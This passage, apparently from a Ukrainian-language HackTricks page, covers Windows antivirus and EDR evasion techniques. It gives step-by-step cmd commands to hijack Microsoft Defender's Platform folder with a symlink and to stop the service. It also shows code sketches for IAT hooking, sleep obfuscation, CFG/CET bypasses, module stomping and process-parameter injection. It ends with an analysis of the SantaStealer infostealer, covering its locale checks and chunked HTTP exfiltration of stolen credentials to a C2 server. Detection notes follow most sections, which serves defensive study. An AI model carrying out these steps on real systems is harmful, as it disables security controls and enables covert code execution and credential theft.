- Потрібні локальні права адміністратора/SYSTEM для встановлення/запуску service і вікно для перезавантаження.
- Timing має критичне значення: target не повинен бути відкритим; виконання під час завантаження запобігає file locks.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо його parent — нестандартний launcher, під час або близько до завантаження.
- Нові services, налаштовані на auto-start підозрілих binaries і стабільно запускаються до Defender/AV. Перевіряйте створення/модифікацію service перед збоями запуску Defender.
- File integrity monitoring для binaries/Platform directories Defender; неочікуване створення/модифікація файлів процесами з protected-process flags.
- ETW/EDR telemetry: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL non-AV binaries.

Заходи протидії
- WDAC/Code Integrity: обмежте, які signed binaries можуть запускатися як PPL і з-під яких parent; блокуйте запуск ClipUp поза легітимними контекстами.
- Service hygiene: обмежте створення/модифікацію auto-start services і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що tamper protection Defender і early-launch protections увімкнені; досліджуйте startup errors, які вказують на пошкодження binary.
- Розгляньте можливість вимкнення генерації коротких імен 8.3 на volumes, де розміщені security tooling, якщо це сумісно з вашим середовищем (ретельно протестуйте).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender обирає platform, з якої він запускається, шляхом перерахування підпапок у:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він обирає підпапку з найвищим лексикографічним значенням version string (наприклад, `4.18.25070.5-0`), а потім запускає процеси service Defender звідти (відповідно оновлюючи шляхи service/registry). Цей вибір довіряє directory entries, зокрема directory reparse points (symlinks). Адміністратор може використати це, щоб перенаправити Defender до шляху, доступного для запису attacker, і досягти DLL sideloading або service disruption.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Local Administrator (потрібен для створення directories/symlinks у папці Platform)
- Можливість виконати reboot або ініціювати повторний вибір Defender platform (service restart під час завантаження)
- Потрібні лише вбудовані tools (`mklink`)

Чому це працює
- Defender блокує записи у власні folders, але вибір platform довіряє directory entries і вибирає найвищу лексикографічно version без перевірки, чи веде target до protected/trusted path.

Покроково (приклад)
1) Підготуйте writable clone поточної platform folder, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть символічне посилання на каталог із вищою версією всередині Platform, яке вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Сценарії після exploitation
- DLL sideloading/code execution: Додайте або замініть DLL, які Defender завантажує з каталогу свого застосунку, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть version-symlink, щоб під час наступного запуску налаштований шлях не визначився, а Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зверніть увагу, що ця техніка сама по собі не забезпечує підвищення привілеїв; для її використання потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перенести runtime evasion із C2 implant безпосередньо до цільового модуля, перехоплюючи його Import Address Table (IAT) і спрямовуючи вибрані API через контрольований зловмисником position‑independent code (PIC). Це узагальнює evasion за межі невеликого набору API, який надають багато kit (наприклад, CreateProcessA), і поширює ті самі захисні механізми на BOFs та post‑exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід високого рівня
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (prepended або companion). PIC має бути самодостатнім і position-independent.
- Під час завантаження host DLL пройдіть через його IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasion перед tail-calling реальної адреси API. Типові evasion включають:
- Маскування/демаскування пам’яті навколо виклику (наприклад, шифрування beacon regions, RWX→RX, зміна назв/дозволів сторінок), а потім відновлення після виклику.
- Call-stack spoofing: побудова безпечного стека та перехід до цільового API, щоб аналіз call stack визначав очікувані фрейми.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб Aggressor script (або еквівалент) міг реєструвати API, які потрібно перехоплювати для Beacon, BOFs і post‑ex DLLs.

Чому тут використовується IAT hooking
- Працює для будь-якого коду, який використовує перехоплений імпорт, без модифікації коду tool і без покладання на Beacon як proxy для конкретних API.
- Охоплює post‑ex DLLs: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати те саме masking/stack evasion до їхніх викликів API.
- Відновлює надійне використання post‑ex команд для створення процесів проти detections, що базуються на call stack, обгортаючи CreateProcessA/W.

Мінімальний ескіз IAT hook (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосовуйте patch після relocations/ASLR і до першого використання import. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Робіть wrappers короткими та PIC-safe; визначайте справжній API через початкове значення IAT, захоплене до patching, або через LdrGetProcedureAddress.
- Використовуйте переходи RW → RX для PIC і не залишайте сторінки одночасно writable+executable.

Stub для підміни call stack
- PIC stubs у стилі Draugr створюють fake call chain (return addresses у benign modules), а потім переходять до справжнього API.
- Це обходить detections, які очікують canonical stacks від Beacon/BOFs до sensitive APIs.
- Поєднуйте зі stack cutting/stack stitching techniques, щоб опинитися всередині очікуваних frames перед прологом API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLLs, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації target APIs, щоб Beacon і BOFs прозоро отримували переваги того самого evasion path без змін коду.

Міркування щодо Detection/DFIR
- IAT integrity: entries, які вказують на non-image (heap/anon) addresses; періодична перевірка import pointers.
- Stack anomalies: return addresses, що не належать loaded images; різкі переходи до non-image PIC; непослідовна ancestry RtlUserThreadStart.
- Loader telemetry: in-process writes до IAT, рання активність DllMain, що змінює import thunks, неочікувані RX regions, створені під час load.
- Image-load evasion: якщо hooking LoadLibrary*, відстежуйте підозрілі loads automation/clr assemblies, пов’язані з memory masking events.

Пов’язані building blocks і приклади
- Reflective loaders, що виконують IAT patching під час load (наприклад, TitanLdr, AceLdr)
- Memory masking hooks (наприклад, simplehook) і stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks через resident PICO

Якщо ви контролюєте reflective loader, можна виконати hooking imports **під час** `ProcessImports()`, замінивши вказівник loader's `GetProcAddress` на custom resolver, який спочатку перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **resident PICO** (persistent PIC object), який зберігається після вивільнення transient loader PIC.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте hash-based hook lookup на кшталт `__resolve_hook(ror13hash(name))`. Якщо hook існує, повертайте його; інакше передавайте виклик справжньому `GetProcAddress`.
- Реєструйте hook targets під час link time за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається чинним, оскільки розташований усередині resident PICO.

Це забезпечує **import-time IAT redirection** без patching code section завантаженої DLL після load.

### Примусове додавання hookable imports, коли target використовує PEB-walking

Import-time hooks спрацьовують лише тоді, коли функція справді присутня в IAT target. Якщо module визначає APIs через PEB-walk + hash (без import entry), примусово додайте реальний import, щоб шлях `ProcessImports()` loader побачив його:

- Замініть hashed export resolution (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на direct reference на кшталт `&WaitForSingleObject`.
- Compiler створить IAT entry, що дасть змогу перехопити його, коли reflective loader розв’язує imports.

### Sleep/idle obfuscation у стилі Ekko без patching `Sleep()`

Замість patching `Sleep` hook’айте **фактичні wait/IPC primitives**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалих waits обгорніть виклик у obfuscation chain у стилі Ekko, яка шифрує in-memory image під час idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer` для планування послідовності callbacks, які викликають `NtContinue` із підготовленими `CONTEXT` frames.
- Типовий chain (x64): встановити image у `PAGE_READWRITE` → виконати RC4 encryption через `advapi32!SystemFunction032` над усім mapped image → виконати blocking wait → виконати RC4 decryption → **відновити permissions кожної section**, обходячи PE sections → подати signal про завершення.
- `RtlCaptureContext` надає template `CONTEXT`; клонуйте його в кілька frames і встановлюйте registers (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте “success” для тривалих waits (наприклад, `WAIT_OBJECT_0`), щоб caller продовжував виконання, поки image masked. Цей pattern приховує module від scanners під час idle windows і уникає класичної signature “patched `Sleep()`”.

Ідеї для Detection (на основі telemetry)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` над великими суміжними buffers розміром з image.
- `VirtualProtect` для великих діапазонів, після якого виконується custom restoration permissions кожної section.

### Runtime CFG registration для sleep-obfuscation gadgets

У targets із CFG перший непрямий jump до mid-function gadget, такого як `jmp [rbx]` або `jmp rdi`, зазвичай призведе до crash process із `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG metadata module. Щоб зберегти chains у стилі Ekko/Kraken усередині hardened processes:<sup>[[30]](#references)</sup>

- Реєструйте кожен indirect destination, який використовується chain, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і entries `CFG_CALL_TARGET_VALID`.
- Для addresses усередині loaded images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **image base** і охоплювати **повний image size**.
- Для manually mapped/PIC/stomped regions використовуйте **allocation base** і allocation size.
- Позначайте не лише dispatch gadget, а й exports, до яких досягається indirect path (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також усі attacker-controlled executable sections, які стануть indirect targets.

Це перетворює sleep chains у стилі ROP/JOP із “працює лише в non-CFG processes” на reusable primitive для `explorer.exe`, browsers, `svchost.exe` та інших endpoints, скомпільованих із `/guard:cf`.

### CET-safe stack spoofing для sleeping threads

Повна заміна `CONTEXT` є помітною і може не працювати в CET Shadow Stack systems, оскільки spoofed `Rip` все одно має відповідати hardware shadow stack. Безпечніший pattern для sleep-masking:<sup>[[30]](#references)</sup>

- Виберіть інший thread у тому самому process і прочитайте bounds його stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Зробіть backup реального TEB/TIB поточного thread.
- Захопіть реальний sleeping context через `GetThreadContext`.
- Скопіюйте **лише** реальний `Rip` у spoof context, залишивши spoofed `Rsp`/stack state без змін.
- Під час sleep window скопіюйте spoof thread's `NT_TIB` у current TEB, щоб stack walkers виконували unwind усередині legitimate stack range.
- Після завершення wait відновіть початкові TIB і thread context.

Це зберігає CET-consistent instruction pointer, водночас вводячи в оману EDR stack walkers, які довіряють TEB stack metadata для перевірки unwinds.

### APC-based alternative: Kraken Mask

Якщо timer-queue dispatch має надто впізнавану signature, ту саму послідовність sleep-encrypt-spoof-restore можна виконати із suspended helper thread за допомогою queued APCs:<sup>[[27]](#references)</sup>

- Створіть helper thread із `NtTestAlert` як entrypoint.
- Queue підготовлені `CONTEXT` frames/APCs через `NtQueueApcThread` і drain їх через `NtAlertResumeThread`.
- Зберігайте chain state у heap, а не в helper stack, щоб не вичерпати стандартний 64 KB thread stack.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати signal start event і заблокуватися.
- Suspend main thread перед відновленням TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити race window, у якому scanner міг би перехопити partially restored stack.

Це замінює signature `CreateTimerQueueTimer` + `NtContinue` на signature helper-thread/APC, зберігаючи ті самі цілі RC4 masking і stack-spoofing.

Додаткові ідеї для Detection
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до sleeps, waits або APC dispatch.
- `GetThreadContext`/`SetThreadContext` в обгортці навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- `NtQueryInformationThread`, після якого виконуються direct writes у stack bounds TEB/TIB поточного thread.
- Chains `NtQueueApcThread`/`NtAlertResumeThread`, які непрямо досягають `SystemFunction032`, `VirtualProtect` або helpers для restoration permissions sections.
- Повторне використання коротких gadget signatures, таких як `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch pivots усередині signed modules.


## Precision Module Stomping

Module stomping виконує payload із **`.text` section DLL, уже mapped усередині target process**, замість виділення очевидної private executable memory або завантаження нової sacrificial DLL. Target для overwrite має бути **loaded, disk-backed image**, code space якого може вмістити payload без пошкодження code paths, потрібних process.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір target

Naive stomping проти common modules, таких як `uxtheme.dll` або `comctl32.dll`, є ненадійним: DLL може бути не завантажена у remote process, а надто мала code region призведе до crash process. Надійніший workflow:

1. Перерахуйте modules target process і залиште **names-only include list** DLL, які вже завантажені.
2. Спочатку зберіть payload і зафіксуйте його **точний розмір у bytes**.
3. Проскануйте candidate DLLs на диску та порівняйте PE section **`.text` `Misc_VirtualSize`** із розміром payload. Це важливіше за file size, оскільки відображає розмір executable section **після mapping у memory**.
4. Розберіть **Export Address Table (EAT)** і виберіть RVA exported function як stomp start offset.
5. Обчисліть **blast radius**: якщо payload перевищує межу вибраної function, він перезапише adjacent exports, розташовані після неї в memory.

Типові recon/selection helpers, які зустрічаються на практиці:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Операційні примітки
- Надавайте перевагу DLL, які **вже завантажені** у віддалений процес, щоб уникнути telemetry від `LoadLibrary`/неочікуваних завантажень образів.
- Надавайте перевагу exports, які цільовий застосунок виконує рідко, інакше звичайні code paths можуть звернутися до перезаписаних bytes до або після створення thread.
- Великі implants часто потребують зміни вбудовування shellcode з string literal на **byte-array/braced initializer**, щоб повний buffer коректно представлявся у вихідному коді injector.

Ідеї для виявлення
- Віддалені записи в **executable pages, пов’язані з образом** (`MEM_IMAGE`, `PAGE_EXECUTE*`), замість поширеніших приватних RWX/RX allocations.
- Точки входу exports, чиї in-memory bytes більше не відповідають backing file на диску.
- Віддалені threads або context pivots, які починають виконання всередині legitimate DLL export, чиї перші bytes нещодавно було змінено.
- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory` для DLL `.text` pages, після яких створюється thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це техніка **process-injection / EDR-evasion**, яка уникає класичного remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання bytes у вже запущений target вона використовує той факт, що Windows **копіює вибрані startup parameters `CreateProcessW` у child process** і зберігає їх усередині `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers, які копіюються `CreateProcessW`

Корисні carriers:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження carriers:

- `lpCommandLine` має вказувати на **writable memory** для `CreateProcessW` і обмежений **32 767 Unicode characters**, включно з null terminator.
- `lpEnvironment` має бути Unicode environment block із послідовних рядків `NAME=VALUE\0`, завершених додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому mapping до `ShellInfo` слід розглядати як implementation detail, а не як стабільний документований contract.

Це перетворює звичайне створення процесу на **payload-transfer primitive**. Оператор створює child process із attacker-controlled startup data і дозволяє Windows виконати cross-process copy.

### Remote lookup flow без remote write APIs

Після створення child process знайдіть скопійований buffer за допомогою **read-only primitives**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати remote `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Мінімальний flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не є executable. Типовий ланцюжок P3:

1. Створити процес у звичайному режимі (не в suspended-режимі)
2. Зробити вибрану сторінку параметрів executable за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати handle основного потоку, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних workflow для thread hijacking, це **не потребує** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через повернутий handle основного потоку.

Це дає змогу уникнути кількох API, які зазвичай відстежуються під час injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження null-byte та staged shellcode

Усі три carrier-и є **рядковими або подібними до рядків даними**, тому raw payload, що містить `0x00`, обрізається під час передачі. Практичний workaround — **null-free first stage**, який відновлює constants під час виконання, а потім завантажує довільний second stage.

Простий pattern — synthesis constants на основі XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Це дає змогу першому етапу створювати рядки для stack, аргументи API, шляхи до DLL або loader shellcode другого етапу без вбудовування null bytes у параметр, що передається.

### Stack-based API calls from the first stage

Коли першому етапу потрібно викликати API, наприклад `LoadLibraryA`, він може:

- помістити рядок/буфер у stack цільового процесу
- зарезервувати **32-байтовий x64 shadow space**
- встановити `RCX`, `RDX`, `R8`, `R9` у константи або вказівники, відносні до `RSP`
- зберігати **16-байтове вирівнювання** `RSP` перед викликом

Після цього другий етап можна скопіювати зі stack у виділену область `PAGE_READWRITE`, змінити її на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect`, а потім передати їй керування, уникаючи прямого виділення RWX.

### Ідеї для виявлення

Добрі можливості для threat hunting, згадані авторами:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, які роблять **сторінки параметрів процесу виконуваними**
- подальша зміна захисту через `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією у `lpCommandLine`, `lpEnvironment` або `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **прийом міжпроцесного передавання**, а не повний execution primitive сам по собі: скопійованому параметру все одно потрібна зміна дозволу на виконання та метод перенаправлення виконання.
- `RtlCreateProcessReflection` / Dirty Vanity розглядалися авторами, але були відхилені, оскільки всередині вони звертаються до підозрілих primitives, таких як `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## Tradecraft SantaStealer для безфайлового ухилення та крадіжки облікових даних

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні info-stealers поєднують AV bypass, anti-analysis і доступ до облікових даних в одному workflow.<sup>[[24]](#references)</sup>

### Перевірка розкладки клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури через `GetKeyboardLayoutList`. Якщо виявлено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску stealers, гарантуючи, що він ніколи не активується у виключених локалях, водночас залишаючи артефакт для threat hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Багаторівнева логіка `check_antivm`

- Variant A проходить список процесів, хешує кожне ім’я за допомогою власної rolling checksum і порівнює його з вбудованими blocklist для debuggers/sandboxes; потім повторює checksum для імені комп’ютера та перевіряє робочі каталоги, зокрема `C:\analysis`.
- Variant B перевіряє властивості системи (мінімальну кількість процесів, нещодавній час безперервної роботи), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує timing checks навколо sleep, щоб виявити single-stepping. Будь-яке спрацювання перериває виконання до запуску модулів.

### Fileless helper + подвійне ChaCha20 reflective loading

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або manually mapped у пам’ять; у fileless mode він самостійно розв’язує imports/relocations, тому артефакти helper не записуються.
- Цей helper зберігає DLL другого етапу, двічі зашифровану за допомогою ChaCha20 (два 32-байтові ключі + 12-байтові nonce). Після обох проходів він reflectively loads blob (без `LoadLibrary`) і викликає exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Рутини ChromElevator використовують direct-syscall reflective process hollowing для ін’єкції в активний Chromium browser, успадковують ключі AppBound Encryption і розшифровують passwords/cookies/credit cards безпосередньо з SQLite databases, попри hardening ABE.


### Модульний збір у пам’яті та chunked HTTP exfil

- `create_memory_based_log` перебирає глобальну таблицю function-pointer `memory_generators` і створює по одному thread для кожного увімкненого модуля (Telegram, Discord, Steam, screenshots, documents, browser extensions тощо). Кожен thread записує результати у спільні buffers і повідомляє кількість файлів після ~45-секундного join window.
- Після завершення всі дані архівуються за допомогою статично скомпонованої бібліотеки `miniz` як `%TEMP%\\Log.zip`. Потім `ThreadPayload1` очікує 15 с і передає archive частинами по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Кожен chunk додає `User-Agent: upload`, `auth: <build_id>`, опційно `w: <campaign_tag>`, а останній chunk додає `complete: true`, щоб C2 знав, що reassembly завершено.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
{{#include ../banners/hacktricks-training.md}}
